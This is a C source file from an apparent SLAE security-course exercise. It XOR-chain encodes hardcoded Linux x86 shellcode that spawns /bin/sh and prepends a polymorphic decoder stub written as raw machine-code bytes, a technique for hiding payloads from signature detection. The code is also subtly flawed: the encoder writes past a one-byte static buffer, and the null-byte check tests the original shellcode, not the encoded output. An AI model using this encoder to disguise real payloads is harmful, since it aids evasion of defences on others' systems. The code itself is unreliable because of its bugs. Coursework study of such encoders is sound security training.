/* Filename    : encoder.c
 * Author      : Joris Hartog
 * Date        : 17-12-2015
 * Student     : SLAE-704
 * Description : This program encodes by XOR'ing each byte of the 
 *  original shellcode with the previous result. The first byte 
 *  is XOR'ed with a key.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

typedef enum {false, true} bool;

bool containsNulls(char *shellcode) {
	int i;
	bool answer = false;

	for(i = 0; i < strlen(shellcode); i++) {
		if (shellcode[i] == 0x00)
			answer = true;
	}

	return answer;
}

char* encode(char *shellcode, char key) {
	static char encodedCode[] = "";

	int i;
	encodedCode[0] = shellcode[0]^key;
	for(i = 1; i < strlen(shellcode); i++) {
		encodedCode[i] = shellcode[i]^encodedCode[i-1];
	}

	return encodedCode;
}

char* polymorphicDecoder(char key, int codeLength) {
	static char stub[] = \
	"\xeb\x16\x5e\x6a\xaa\x58\x6a\xaa\x59\x8a\x16\x30\x06\x88\xd3\x46\x8a\x16\x30\x1e\xe2\xf7\xeb\x05\xe8\xe5\xff\xff\xff";

	stub[4] = key;
	stub[7] = (unsigned char)(codeLength - 1);
	return stub;
}

char createKey() {
	char key = (char)( rand() % 0x100 );
	return key;
}

void showUsage(char *name) {
	printf("Usage  : %s [shellcode]\n", name);
	printf("Example: %s \\x12\\x34\\x56\\x78\\x90\\xab\\xcd\\xef\n", name);
}

int main(int argc, char *argv[]) {
	// Check if number of arguments is correct
	if(argc != 2) {
		showUsage(argv[0]);
		return 0;
	}

	// Import the shellcode
	printf("[*] Importing shellcode..\n");
	//char *shellcode = argv[1];
	char shellcode[] = \
	"\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
	char *encodedShellcode = "";

	// Seed random number generator with the current time
	printf("[*] Seeding random number generator..\n");
	srand(time(NULL));

	// Encode shellcode with new keys until no the
	//  code contains no nulls.
	printf("[*] Encoding..\n");
	char key;
	do {
		// Get random key
		key = createKey();
		printf("[ ] Key = 0x%02x\n", (0xFF & key));

		// Encode shellcode
		encodedShellcode = encode(shellcode, key);
	} while (containsNulls(shellcode) == true);

	// Get polymorphic decoder stub
	printf("[*] Creating polymorphic decoder-stub..\n");
	char *decoderStub = polymorphicDecoder(key, strlen(encodedShellcode));

	printf("[*] Done with decoder-stub of %d bytes and shellcode of %d bytes!\n", strlen(decoderStub), strlen(encodedShellcode));

	// Print decoder stub
	printf("[>] Decoder-stub: ");
	int i;
	for(i = 0; i < strlen(decoderStub); i++) {
		printf("0x%02x", (0xFF & decoderStub[i]));
		if (i+1 < strlen(decoderStub)) {
			printf(",");
		}
	}

	// Print encoded shellcode
	printf("\n[>] Shellcode: ");
	for(i = 0; i < strlen(encodedShellcode); i++) {
		printf("0x%02x", (0xFF & encodedShellcode[i]));
		if (i+1 < strlen(encodedShellcode)) {
			printf(",");
		}
	}
	printf("\nClean code:\n");
        for(i = 0; i < strlen(decoderStub); i++) {
                printf("\\x%02x", (0xFF & decoderStub[i]));
        }
        for(i = 0; i < strlen(encodedShellcode); i++) {
                printf("\\x%02x", (0xFF & encodedShellcode[i]));
        }

	printf("\n");
}

